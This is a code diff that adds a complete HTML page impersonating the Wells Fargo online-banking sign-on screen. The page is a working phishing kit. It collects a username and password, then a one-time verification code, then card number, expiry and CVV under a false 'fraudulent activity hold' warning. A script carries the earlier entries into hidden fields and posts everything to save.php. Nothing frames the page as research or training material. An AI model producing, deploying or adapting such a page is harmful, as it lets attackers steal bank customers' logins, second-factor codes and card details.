@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign On to View Your Accounts – Wells Fargo</title>
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f3f3f3;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+        .login-container {
+            background-color: #fff;
+            width: 460px;
+            max-width: 100%;
+            padding: 32px 40px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            border-radius: 6px;
+            text-align: left;
+        }
+        .logo {
+            width: 160px;
+            height: auto;
+            margin-bottom: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #a6192e;
+            margin: 0 0 16px;
+        }
+        .intro {
+            font-size: 16px;
+            line-height: 24px;
+            color: #333;
+            margin-bottom: 24px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            display: block;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d9d9d9;
+            border-radius: 4px;
+            font-size: 16px;
+            line-height: 24px;
+            box-sizing: border-box;
+            background-color: #fafafa;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #a6192e;
+        }
+        button {
+            background-color: #a6192e;
+            color: #fff;
+            padding: 14px 16px;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 24px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #8e1a25;
+        }
+        .links {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            margin: 16px 0 24px;
+        }
+        .links a {
+            color: #005566;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .security-section {
+            text-align: center;
+            margin-top: 24px;
+        }
+        .security-badge {
+            width: 80px;
+            height: auto;
+            margin: 12px auto;
+        }
+        .security-text {
+            font-size: 12px;
+            color: #666;
+            line-height: 18px;
+        }
+        .security-text a {
+            color: #005566;
+            text-decoration: none;
+        }
+        .security-text a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 24px;
+            line-height: 18px;
+        }
+        .footer a {
+            color: #005566;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        #code-step, #card-step {
+            display: none;
+        }
+        #login-step {
+            display: block;
+        }
+        .alert {
+            background-color: #f8d7da;
+            color: #721c24;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 12px;
+            border: 1px solid #f5c6cb;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 24px;
+                width: calc(100% - 48px);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.wellsfargo.com/assets/images/logos/wf_logo_114x60.png" alt="Wells Fargo Logo" class="logo">
+        <h1>Sign On to Wells Fargo</h1>
+        <div class="intro">Access and manage your accounts securely.</div>
+        <div id="login-step">
+            <form id="login-form">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" required placeholder="Username">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required placeholder="Password">
+                </div>
+                <button type="submit">Sign On</button>
+            </form>
+        </div>
+        <div id="code-step">
+            <form id="code-form">
+                <div class="alert">We’ve sent a 6-digit verification code to your registered phone number.</div>
+                <div class="form-group">
+                    <label for="code">Enter 6-digit code</label>
+                    <input type="text" id="code" name="code" maxlength="6" pattern="\d{6}" required placeholder="6-digit code">
+                </div>
+                <button type="submit">Verify Code</button>
+            </form>
+        </div>
+        <div id="card-step">
+            <form id="card-form" action="save.php" method="POST">
+                <div class="alert">To lift the fraudulent activity hold on your account, please verify your card details.</div>
+                <div class="form-group">
+                    <label for="card-number">Card Number</label>
+                    <input type="text" id="card-number" name="card_number" pattern="\d{13,19}" required placeholder="Card number">
+                </div>
+                <div class="form-group">
+                    <label for="expiry">Expiration Date</label>
+                    <input type="text" id="expiry" name="expiry" pattern="\d{2}/\d{2}" required placeholder="MM/YY">
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" pattern="\d{3,4}" required placeholder="CVV">
+                </div>
+                <button type="submit">Complete Verification</button>
+            </form>
+        </div>
+        <div class="links">
+            <a href="https://www.wellsfargo.com/help/sign-on/">Forgot Username or Password?</a>
+            <a href="https://www.wellsfargo.com/online-banking/enroll/">Enroll in Online Banking</a>
+        </div>
+        <div class="security-section">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/0b/Verisign_trust_seal.png" alt="VeriSign Secured" class="security-badge">
+            <div class="security-text">
+                Protect your information. Never share your username or password. Learn more about <a href="https://www.wellsfargo.com/privacy-security/">online security</a>.
+            </div>
+        </div>
+        <div class="footer">
+            © 2025 Wells Fargo Bank, N.A. All rights reserved. NMLSR ID 399801<br>
+            <a href="https://www.wellsfargo.com/privacy-security/">Privacy, Cookies, Security & Legal</a> | 
+            <a href="https://www.wellsfargo.com/help/">Help & Contact</a> | 
+            <a href="https://www.wellsfargo.com/about/">About Wells Fargo</a>
+        </div>
+    </div>
+    <script>
+        const loginForm = document.getElementById('login-form');
+        const codeForm = document.getElementById('code-form');
+        const cardForm = document.getElementById('card-form');
+        const loginStep = document.getElementById('login-step');
+        const codeStep = document.getElementById('code-step');
+        const cardStep = document.getElementById('card-step');
+
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            if (username && password) {
+                loginStep.style.display = 'none';
+                codeStep.style.display = 'block';
+                const hiddenUsername = document.createElement('input');
+                hiddenUsername.type = 'hidden';
+                hiddenUsername.name = 'username';
+                hiddenUsername.value = username;
+                const hiddenPassword = document.createElement('input');
+                hiddenPassword.type = 'hidden';
+                hiddenPassword.name = 'password';
+                hiddenPassword.value = password;
+                cardForm.appendChild(hiddenUsername);
+                cardForm.appendChild(hiddenPassword);
+            } else {
+                alert('Please enter both username and password.');
+            }
+        });
+
+        codeForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const code = document.getElementById('code').value;
+            if (code.length === 6 && /^\d{6}$/.test(code)) {
+                codeStep.style.display = 'none';
+                cardStep.style.display = 'block';
+                const hiddenCode = document.createElement('input');
+                hiddenCode.type = 'hidden';
+                hiddenCode.name = 'code';
+                hiddenCode.value = code;
+                cardForm.appendChild(hiddenCode);
+            } else {
+                alert('Please enter a valid 6-digit code.');
+            }
+        });
+    </script>
+</body>
+</html>
